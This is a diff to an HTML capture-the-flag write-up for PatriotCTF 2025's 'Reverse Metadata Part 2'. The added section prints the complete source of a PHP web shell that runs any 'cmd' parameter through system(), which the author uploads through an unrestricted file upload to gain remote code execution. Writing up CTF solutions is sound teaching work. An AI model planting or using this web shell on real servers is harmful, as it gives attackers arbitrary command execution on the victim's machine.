@@ -170,8 +170,30 @@
   <h1>Reverse Metadata Part 2</h1>
   <div class="meta">PatriotCTF 2025 • <span>Misc</span> • syndro</div>
 
-  <h2>1. Same Vulnerability, New Challenge</h2>
-  <p>Exactly the same unrestricted file upload as Part 1 — we upload our one-liner PHP shell <code>syndro.php</code> and get instant RCE again.</p>
+      <h2>0. The Challenge Description</h2>
+
+    <p>It is pretty much the same thing as part1, But different flag location.</p>
+    <img src="Pic/ReverseMetadataPart2/1.png" alt="Challenge Description">
+
+  <h2>1. Same Vulnerability, New Location.</h2>
+  <p>we upload our PHP shell <code>syndro.php</code> and get instant RCE again.</p>
+
+  <pre><code>&lt;html&gt;
+&lt;body&gt;
+  &lt;form method="GET" name="&lt;?php echo basename($_SERVER['PHP_SELF']); ?&gt;"&gt;
+  &lt;input type="TEXT" name="cmd" autofocus id="cmd" size="80"&gt;
+  &lt;input type="SUBMIT" value="Execute"&gt;
+  &lt;/form&gt;
+&lt;?php
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd'] . ' 2&gt;&amp;1');
+    }
+?&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+    
+    <pre>Reference: https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985</pre>
 
   <h2>2. Exploring the Filesystem</h2>
   <p>The uploads directory is empty except our shell. Time to break out:</p>
